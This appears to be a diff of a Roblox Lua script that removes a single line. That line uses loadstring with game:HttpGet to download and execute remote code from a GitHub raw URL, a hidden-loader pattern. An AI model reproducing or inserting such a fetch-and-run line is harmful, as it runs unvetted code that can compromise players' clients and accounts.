@@ -3,7 +3,6 @@ local replicatedStorage = game:GetService("ReplicatedStorage")
 local tweenService = game:GetService("TweenService")
 local players = game:GetService("Players")
 local runService = game:GetService("RunService")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/houseguynew/misc-scripts/refs/heads/main/discord%20to%20roblox.txt"))()
 local localPlayer = players.LocalPlayer
 local currentCamera = workspace.CurrentCamera
 local val = false
